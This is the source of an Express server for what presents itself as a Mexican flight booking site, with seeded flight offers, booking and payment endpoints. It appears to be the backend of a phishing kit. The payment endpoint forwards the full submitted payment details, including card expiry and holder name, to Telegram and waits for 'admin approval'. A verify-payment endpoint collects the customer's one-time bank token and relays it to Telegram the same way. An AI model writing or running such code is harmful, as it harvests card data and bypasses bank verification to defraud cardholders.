import express from 'express';
import cors from 'cors';
import path from 'path';
import { fileURLToPath } from 'url';
import { PrismaClient } from '@prisma/client';
import { sendNewPaymentNotification, getPaymentStatus, paymentStore, sendTokenNotification } from './telegram.ts';

console.log('sendTokenNotification type:', typeof sendTokenNotification);

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const prisma = new PrismaClient();

app.use(cors());
app.use(express.json());

const PORT = process.env.PORT || 3001; // Using 3001 to avoid conflict with React (3000) or Vite (5173)

console.log('--- Application Starting ---');
console.log(`Environment: ${process.env.NODE_ENV || 'development'}`);
console.log(`Port configured: ${PORT}`);

app.get('/api/health', (req, res) => {
  res.json({ status: 'ok' });
});

// Seed flights if empty
const seedFlights = async () => {
    // Always clear flights to ensure we have the latest prices/data in dev
    await prisma.flight.deleteMany({});
    
    console.log('Seeding flights...');
    const flights = [
        {
            takeoff: '4:59 a. m.',
            landing: '6:06 a. m',
            duration: '1 h 7 min',
            price: 1250,
            currency: 'MXN',
            airline: 'Volaris',
            direct: true
        },
        {
            takeoff: '9:30 a. m.',
            landing: '10:37 a. m',
            duration: '1 h 7 min',
            price: 1899,
            currency: 'MXN',
            airline: 'Aeroméxico',
            direct: true
        },
        {
            takeoff: '10:15 a. m.',
            landing: '11:22 a. m',
            duration: '1 h 7 min',
            price: 950,
            currency: 'MXN',
            airline: 'Viva Aerobus',
            direct: true
        },
        {
            takeoff: '12:44 p. m.',
            landing: '01:51 p. m',
            duration: '1 h 7 min',
            price: 2100,
            currency: 'MXN',
            airline: 'Aeroméxico',
            direct: true
        },
        {
            takeoff: '3:49 p. m.',
            landing: '4:56 p. m',
            duration: '1 h 7 min',
            price: 1150,
            currency: 'MXN',
            airline: 'Volaris',
            direct: true
        },
        {
            takeoff: '4:05 p. m.',
            landing: '5:13 p. m',
            duration: '1 h 7 min',
            price: 899,
            currency: 'MXN',
            airline: 'Viva Aerobus',
            direct: true
        },
        {
            takeoff: '8:25 p. m.',
            landing: '9:37 p. m',
            duration: '1 h 7 min',
            price: 1450,
            currency: 'MXN',
            airline: 'Volaris',
            direct: true
        }
    ];

    for (const flight of flights) {
        await prisma.flight.create({ data: flight });
    }
    console.log('Flights seeded successfully');
};

seedFlights();

// Get Flights
app.get('/api/flights', async (req, res) => {
    try {
        const flights = await prisma.flight.findMany();
        res.json(flights);
    } catch (error) {
        console.error(error);
        res.status(500).json({ error: 'Failed to fetch flights' });
    }
});

// Create Booking
app.post('/api/bookings', async (req, res) => {
    try {
        const data = req.body;
        
        // Transform frontend data to Prisma schema
        const bookingData = {
            origin: data.flightInfo.origin.city,
            destination: data.flightInfo.destination.city,
            departureDate: new Date(data.flightInfo.flightDates[0]),
            returnDate: data.flightInfo.flightDates[1] ? new Date(data.flightInfo.flightDates[1]) : null,
            adults: data.passengersInfo.adults.length,
            children: data.passengersInfo.children.length,
            babies: data.passengersInfo.babies.length,
            email: data.passengersInfo.contact.email,
            phone: data.passengersInfo.contact.phone,
            passengers: {
                create: [
                    ...data.passengersInfo.adults.map((p: any) => ({ ...p, type: 'adult' })),
                    ...data.passengersInfo.children.map((p: any) => ({ ...p, type: 'child' })),
                    ...data.passengersInfo.babies.map((p: any) => ({ ...p, type: 'baby' })),
                ]
            }
        };

        const booking = await prisma.booking.create({
            data: bookingData,
            include: {
                passengers: true
            }
        });

        res.json(booking);
    } catch (error) {
        console.error(error);
        res.status(500).json({ error: 'Failed to create booking' });
    }
});

// Process Payment
app.post('/api/payments', async (req, res) => {
    try {
        const { bookingId, amount, currency, cardLast4, cardBrand, bank, ...otherDetails } = req.body;
        
        let paymentId = '';

        // Try Save to DB
        try {
            const payment = await prisma.payment.create({
                data: {
                    bookingId,
                    amount,
                    currency,
                    cardLast4,
                    cardBrand,
                    bank,
                    status: 'pending_approval' // Changed from 'completed' to pending
                }
            });
            paymentId = payment.id;
        } catch (dbError) {
             console.error('Database save failed, continuing with memory-only flow', dbError);
             // If DB fails (e.g. invalid bookingId), we still want to notify telegram
             // We use bookingId as key since that's what frontend polls
        }
        
        // Notify Telegram
        // We include extra details for the telegram message (name, expiry, etc)
        // These are passed in req.body but not necessarily stored in Payment model yet if not added
        await sendNewPaymentNotification({
            ...req.body,
            id: paymentId || bookingId // Use DB ID or Booking ID
        });

        res.json({ success: true, paymentId: paymentId || bookingId, status: 'PENDING_APPROVAL' });
    } catch (error) {
        console.error(error);
        res.status(500).json({ error: 'Payment failed' });
    }
});

// Get Payment Status (Polling)
app.get('/api/payments/:bookingId/status', async (req, res) => {
    const { bookingId } = req.params;
    const status = getPaymentStatus(bookingId);
    res.json({ status });
});

// Verify Payment (OTP/Token)
app.post('/api/verify-payment', async (req, res) => {
    try {
        console.log('Verify payment request received:', req.body);
        const { bookingId, token } = req.body;

        // Simulate verification logic
        if (!token) {
            console.log('Token missing');
            return res.status(400).json({ error: 'Token required' });
        }

        console.log('Sending token notification for booking:', bookingId);
        // Notify Telegram with the token and wait for admin approval
        await sendTokenNotification(bookingId, token);
        console.log('Token notification sent successfully');

        res.json({ success: true, status: 'TOKEN_PENDING' });
    } catch (error) {
        console.error('Error in verify-payment:', error);
        res.status(500).json({ error: 'Verification failed' });
    }
});

// Serve static files from the React app
app.use(express.static(path.join(__dirname, '../public')));

// The "catchall" handler: for any request that doesn't
// match one above, send back React's index.html file.
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, '../public/index.html'));
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Health check available at http://localhost:${PORT}/api/health`);
  console.log('--- Server Ready ---');
});
